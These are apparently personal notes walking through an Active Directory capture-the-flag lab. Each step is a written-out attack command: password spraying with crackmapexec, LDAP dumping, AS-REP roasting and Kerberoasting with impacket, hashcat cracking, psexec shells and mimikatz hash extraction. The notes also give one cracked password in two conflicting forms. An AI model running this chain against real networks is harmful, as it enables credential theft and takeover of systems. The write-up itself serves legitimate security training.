<mark>Note</mark>: Start using `netexec` instead of  `crackmapexec`.
- Starting credential pair is `pete` with `Nexus123!`.
- `crackmapexec rdp --continue-on-success 192.168.226.0/24 -d corp.com -u pete -p Nexus123\!` will identify we have no `rdp` access to any of the domain-joined machine.![[Pasted image 20240208225229.png]]
- Since we have no direct access to domain-joined computer and hence no `PowerView` and `SharpHound`, we have to run `ldapdomaindump --no-json --no-grep ldap://192.168.226.70 -u "corp.com\pete" -p Nexus123\!` to retrieve as much as possible about the domain.
- Find `AS-REP roastable` and `Kerberoastable` accounts as well, using:
	1. `impacket-GetNPUsers -dc-ip 192.168.226.70 
	2. corp.com/pete:Nexus123\! -request -outputfile asreproast.hash`![[Pasted image 20240208231854.png]]
	3. `impacket-GetUserSPNs -dc-ip 192.168.226.70 corp.com/pete:Nexus123\! -request -outputfile kerberoast.hash`![[Pasted image 20240208231940.png]]
- Using `hashcat` with a custom rule to append either `1` or `!` will retrieve a new pair of credential as `mike` with `Nexus123\!`. Running `crackmapexec` with `rdp` to spray the new credential will yield nothing again. However, with `crackmapexec smb --continue-on-success 192.168.226.0/24 -d corp -u mike -p Darkness1099\!`, we can identify `mike` to be the **local administrator** of `Client75`.![[Pasted image 20240209002902.png]]
- Using `impacket-psexec corp/mike:Darkness1099\!@192.168.226.75 powershell.exe` to obtain a C2 session and `mimikatz` to find `NTLM hash` of the domain user `maria`.![[Pasted image 20240209023052.png]]
- Again using `psexec` to obtain a C2 session and retrieve the flag.